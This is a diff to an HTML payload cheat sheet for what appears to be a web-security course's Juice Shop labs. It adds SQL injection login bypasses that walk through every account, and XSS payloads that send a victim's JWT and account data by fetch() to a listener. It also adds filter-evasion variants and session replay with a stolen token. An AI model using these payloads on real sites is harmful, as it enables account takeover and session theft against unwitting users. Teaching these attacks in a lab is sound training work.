@@ -370,8 +370,19 @@
                   <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('\' OR 1=1--')">Copy</button>
                 </div>
               </td>
-              <td><strong>Auth bypass in login</strong></td>
+              <td><strong>Auth bypass in login (first row)</strong></td>
               <td>Quote closes the string, <span class="flag-pill">OR 1=1</span> is always true, <span class="flag-pill">--</span> comments out the password check</td>
+              <td><a href="./labs/lab03.html#auth-bypass" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>' OR 1=1 LIMIT 1 OFFSET 1--</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('\' OR 1=1 LIMIT 1 OFFSET 1--')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Pagination user traversal (2nd, 3rd user...)</strong></td>
+              <td><span class="flag-pill">LIMIT 1 OFFSET N</span> skips the first <code>N</code> rows returned by <code>OR 1=1</code> so you can log into every account one by one without knowing their email</td>
               <td><a href="./labs/lab03.html#auth-bypass" class="badge-lab-ref">Lab 03</a></td>
             </tr>
             <tr>
@@ -459,7 +470,7 @@
                 </div>
               </td>
               <td><strong>Prove XSS (DOM, reflected or stored)</strong></td>
-              <td>The image source <span class="flag-pill">x</span> fails to load, so the <span class="flag-pill">onerror</span> handler fires your JS. Works where <code>&lt;script&gt;</code> is stripped but attributes survive</td>
+              <td>The image source <span class="flag-pill">x</span> fails to load, so <span class="flag-pill">onerror</span> fires your JS. Works inside <code>innerHTML</code> sinks (where browsers ignore <code>&lt;script&gt;</code>) or when <code>&lt;script&gt;</code> is filtered</td>
               <td><a href="./labs/lab04.html#dom-xss-live" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
@@ -470,19 +481,52 @@
                 </div>
               </td>
               <td><strong>Read the session token</strong></td>
-              <td>Juice Shop keeps the JWT in <span class="flag-pill">localStorage</span>, which JavaScript can read. <span class="flag-pill">HttpOnly</span> protects cookies, not this</td>
+              <td>Juice Shop stores the JWT in <span class="flag-pill">localStorage</span> and a non-<span class="flag-pill">HttpOnly</span> cookie, so JavaScript can read both</td>
               <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>&lt;img src=x onerror="new Image().src='http://localhost:9000/?c='+localStorage.getItem('token')"&gt;</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=&quot;new Image().src=\'http://localhost:9000/?c=\'+localStorage.getItem(\'token\')&quot;>')">Copy</button>
+                  <code>&lt;img src=x onerror="fetch('http://localhost:9000/?token='+localStorage.getItem('token'))"&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=&quot;fetch(\'http://localhost:9000/?token=\'+localStorage.getItem(\'token\'))&quot;>')">Copy</button>
                 </div>
               </td>
               <td><strong>Exfil the token silently</strong></td>
-              <td>A hidden image request ships the token to a server you control. No popup, nothing for the victim to notice. On a real job that host is a box online or Burp Collaborator</td>
+              <td>Ships the victim's token in the background to a server you control with no popup on their screen. On a real job that host is your VPS or Burp Collaborator</td>
               <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img src=x onerror="fetch('/rest/user/whoami').then(r=&gt;r.text()).then(d=&gt;fetch('http://localhost:9000/?whoami='+encodeURIComponent(d)))"&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=&quot;fetch(\'/rest/user/whoami\').then(r=>r.text()).then(d=>fetch(\'http://localhost:9000/?whoami=\'+encodeURIComponent(d)))&quot;>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Defeat <code>HttpOnly</code> via same-origin <code>fetch()</code></strong></td>
+              <td>Even if a cookie is <code>HttpOnly</code>, the browser attaches it automatically to same-origin requests, so XSS can call internal APIs as the victim</td>
+              <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img/src=x/onerror=alert`1`&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=x/onerror=alert`1`>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>WAF bypass (no spaces, no parens)</strong></td>
+              <td>HTML5 treats <span class="flag-pill">/</span> between tag/attributes as whitespace; ES6 tagged template literals invoke functions using backticks <span class="flag-pill">`1`</span> instead of <code>(1)</code></td>
+              <td><a href="./labs/lab04.html#parser-hacks" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img/src=x/onerror=alert(localStorage.token)&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=x/onerror=alert(localStorage.token)>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Quote-free token read</strong></td>
+              <td>Accesses <span class="flag-pill">localStorage.token</span> as an object property so you never need single or double quotes inside <code>.getItem('token')</code></td>
+              <td><a href="./labs/lab04.html#parser-hacks" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
               <td>
@@ -492,18 +536,18 @@
                 </div>
               </td>
               <td><strong>Start the exfil listener</strong></td>
-              <td>A one-line web server on your own machine. Watch its log for a <code>GET /?c=eyJ...</code> line with the stolen token glued on</td>
+              <td>A one-line web server on your own machine. Watch its log for a <code>GET /?token=eyJ...</code> line with the stolen token attached</td>
               <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>localStorage.setItem('token', '&lt;PASTE_THE_JWT&gt;')</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('localStorage.setItem(\'token\', \'<PASTE_THE_JWT>\')')">Copy</button>
+                  <code>localStorage.setItem('token', '&lt;JWT&gt;'); document.cookie = 'token=&lt;JWT&gt;';</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('localStorage.setItem(\'token\', \'<JWT>\'); document.cookie = \'token=<JWT>\';')">Copy</button>
                 </div>
               </td>
               <td><strong>Hijack: replay a stolen session</strong></td>
-              <td>Run in an incognito Console, paste the stolen JWT, reload. You're logged in as the victim with no password</td>
+              <td>Run in an Incognito Console, paste the stolen JWT into both <code>localStorage</code> and <code>document.cookie</code>, and reload. Logs you in as the victim with no password</td>
               <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
@@ -514,18 +558,18 @@
                 </div>
               </td>
               <td><strong>Reflected / stored, HTML context</strong></td>
-              <td>The classic solve when your input lands in HTML with nothing encoded. If <code>&lt;script&gt;</code> is filtered, fall back to the <span class="flag-pill">onerror</span> image above</td>
+              <td>The classic solve when your input lands in HTML on a full page load. If injected via <code>innerHTML</code> in an SPA, use the <span class="flag-pill">onerror</span> image above instead</td>
               <td><a href="./labs/lab04.html#portswigger-ladder" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>"onmouseover="alert(1)</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('&quot;onmouseover=&quot;alert(1)')">Copy</button>
+                  <code>" autofocus onfocus=alert(document.domain) x="</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('&quot; autofocus onfocus=alert(document.domain) x=&quot;')">Copy</button>
                 </div>
               </td>
               <td><strong>Attribute-context breakout</strong></td>
-              <td>When angle brackets are encoded you can't open a tag. The unencoded double quote closes <code>value="</code> so you bolt an event handler onto the element instead. Exact string depends on the target</td>
+              <td>When angle brackets are encoded you can't open a tag. The unencoded double quote closes <code>value="</code> so you attach <span class="flag-pill">autofocus onfocus</span> onto the existing input tag</td>
               <td><a href="./labs/lab04.html#portswigger-ladder" class="badge-lab-ref">Lab 04</a></td>
             </tr>
           </tbody>
